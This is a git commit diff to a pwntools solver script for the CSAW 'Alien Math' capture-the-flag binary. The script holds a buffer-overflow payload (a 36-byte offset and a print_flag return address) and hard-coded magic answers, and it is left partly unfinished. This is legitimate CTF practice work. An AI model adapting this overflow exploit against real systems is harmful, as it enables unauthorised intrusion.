b8519d181d9ec722c2d5595c92415b6e5363c6a5
M-Pepper <46696465+M-Pepper@users.noreply.github.com>
2021-09-11 18:44:32 -0400

    Update solver.py

--- pwn/Alien_math/solver.py
+++ pwn/Alien_math/solver.py
@@ -1,29 +1,31 @@
 #!/usr/bin/env python3
 
 import random
+from socket import recv_fds
 from pwn import *
 
-context.binary = '/home/mckenziepepper/Documents/b0f-chals/CSAW/alien_math'
+context.binary = binary = '/home/mckenziepepper/Documents/b0f-chals/CSAW/alien_math'
+math_elf = ELF(binary)
+#context.log_level = 'debug' ### Turn me back on for very verbose debugging info
 print_flag = p64(0x4014fb)
 OFFSET = 36
 junk = b"A" * OFFSET
 
-while True:
+while True: #makes it convenient to keep looping feel free to remove while loop
     #p = remote('pwn.chal.csaw.io', 5004, ssl=False)
     p = process('/home/mckenziepepper/Documents/b0f-chals/CSAW/alien_math')
         
-    leak = p.recvuntil(b"What is the square root of zopnol?").strip()
+    guess1 = b"1804289383" #magic number to generate the required hex value
+    p.sendlineafter("What is the square root of zopnol?", guess1)
+    leak = p.recvuntil("!\n")
     log.info(f"{leak = }")
-    rand = random.randint(-2147483648, 2147483647)
-    p.sendline(b"rand")
-    log.info(f"{rand = }")
-    leak = p.recvline()
-    log.info(f"{leak = }")
-    leak = p.recvline()
-    log.info(f"{leak = }")
-    #if leak == b"Incorrect. That's an F for you!\n":  Test if you can directly compare byte values (you can)
-    if leak == b"Correct!\n":
+    if b"Correct!\n" in leak:
         False
+        guess2 = b"7759406485255323229225"
+        p.sendlineafter("How many tewgrunbs are in a qorbnorbf?", guess2)
+        leak = p.recvuntil("You get a C. No flag this time.\n")
+        #leak = p.recvuntil("Genius! One question left...\n") For when we know we can do the second question
+        log.info(f"{leak = }")
         p.interactive()
     else:
         p.kill()
